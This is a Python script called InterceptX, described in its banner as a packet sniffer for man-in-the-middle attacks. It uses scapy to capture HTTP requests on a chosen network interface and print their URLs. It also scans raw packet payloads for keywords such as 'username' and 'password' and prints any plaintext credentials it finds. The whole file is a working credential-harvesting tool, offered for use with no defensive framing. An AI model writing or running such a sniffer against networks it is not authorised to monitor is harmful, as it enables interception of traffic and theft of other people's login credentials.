#!usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
import colorama
import argparse
from colorama import Fore, Style

def get_arguments():
    parser = argparse.ArgumentParser(description="InterceptX - Packet Sniffer for MITM")
    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface to sniff packets on")
    return parser.parse_args()

def start_print():
    ascii_art = """
    ____      __                            __ _  __
   /  _/___  / /____  _____________  ____  / /| |/ /
   / // __ \/ __/ _ \/ ___/ ___/ _ \/ __ \/ __/   / 
 _/ // / / / /_/  __/ /  / /__/  __/ /_/ / /_/   |  
/___/_/ /_/\__/\___/_/   \___/\___/ .___/\__/_/|_|  
                                 /_/                
    """
    print(Fore.GREEN + ascii_art + Style.RESET_ALL)
    print(Fore.BLUE + Style.BRIGHT + "\nInterceptX: A packet sniffer tool designed for MITM attacks, enabling network traffic interception and analysis.\n" + Style.RESET_ALL)
    print(Fore.BLUE + Style.BRIGHT + "Author: Ethan Prime" + Style.RESET_ALL)
    print(Fore.BLUE + Style.BRIGHT + "Email: ethanprime.c137@mail.com" + Style.RESET_ALL)
    print(Fore.BLUE + Style.BRIGHT + "GitHub: https://github.com/Brownpanda29" + Style.RESET_ALL)

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = [b"username", b"user", b"login", b"password", b"pass", b"uname"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> ", url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password  :  ", login_info, "\n\n")

def main():
    colorama.init(autoreset=True)
    args = get_arguments()
    start_print()
    if args.interface:
        try:
            sniff(args.interface)
        except PermissionError:
            print("\n\n[-] Need Sudo permission to run this Programme or You have to be root user. \n\nQuitting...\n")
    else:
        print("Please specify an interface using -i or --interface option. Use -h or --help for more information.")

if __name__ == "__main__":
    main()
